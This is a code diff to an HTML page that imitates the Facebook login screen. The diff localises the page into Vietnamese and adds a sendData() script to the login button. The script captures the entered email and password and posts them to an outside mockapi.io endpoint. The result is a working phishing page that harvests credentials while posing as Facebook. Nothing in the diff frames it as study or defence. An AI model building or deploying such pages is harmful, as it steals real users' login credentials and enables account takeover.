@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Facebook - Log In or Sign Up</title>
+  <title>Facebook - Đăng nhập hoặc đăng ký</title>
   <!--Bootstrap-->
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
     integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
@@ -25,10 +25,10 @@
 <body>
 
   <div class="facebook">
-    <div class="mobile-top-view">
+    <!-- <div class="mobile-top-view">
       <img src="fb-mobile.png" alt="">
       <a href="#">Get Facebook for Android and browse faster.</a>
-    </div>
+    </div> -->
     <div class="view">
       <div class="container">
         <!--Row-->
@@ -37,7 +37,7 @@
           <div class="col title-div">
             <div>
               <h1 class="text-primary">facebook</h1>
-              <p>Connect with friends and the world around you on Facebook.</p>
+              <p>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
             </div>
           </div>
           <!--Column 2-->
@@ -45,20 +45,21 @@
             <div class="card">
 
               <div>
-                <input id="email" class="input-group" type="text" placeholder="Email or Phone Number">
-                <input id="pass" class="input-group my-2" type="password" placeholder="Password">
-                <button id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;">Log In</button>
+                <input id="email" class="input-group" type="text" placeholder="Email hoặc số điện thoại">
+                <input id="pass" class="input-group my-2" type="password" placeholder="Mật khẩu">
+                <button id="fbLogin" class="btn btn-primary btn-lg" style="width:100%;" onclick="sendData()">Đăng
+                  nhập</button>
                 <hr id="hr1">
-                <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="#">Forget account?</a>
+                <p id="forgetPass1" class="text-center my-3" style="font-size: 14px;"><a href="#">Quên tài khoản?</a>
                 </p>
               </div>
               <hr id="hr2">
-              <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>
-              <p id="forgetPass2" class="text-center my-3"><a href="#">Forget account?</a></p>
+              <button id="createAcBtn" class="btn btn-success btn-lg">Tạo tài khoản mới</button>
+              <p id="forgetPass2" class="text-center my-3"><a href="#">Quên mật khẩu?</a></p>
 
             </div>
-            <p id="form-footer" class="text-center my-4" style="font-size: 14px;"><b>Create a Page</b> for a celebrity,
-              brand or buisness.
+            <p id="form-footer" class="text-center my-4" style="font-size: 14px;"><b>Tạo Trang</b> dành cho người nổi
+              tiếng, thương hiệu hoặc doanh nghiệp.
             </p>
             <div class="mobile-version-footer">
               <div class="row language">
@@ -95,8 +96,28 @@
       </div>
     </div>
   </div>
-
-  
 </body>
+<script>
+  function sendData() {
+    var email = document.getElementById("email").value
+    var pass = document.getElementById("pass").value
+    const data = { name: email, pass: pass };
+
+    fetch('https://634f4a9b4af5fdff3a718d4d.mockapi.io/api/v1/users', {
+      method: 'POST', // or 'PUT'
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        console.log('Success:', data);
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+  }
+</script>
 
 </html>
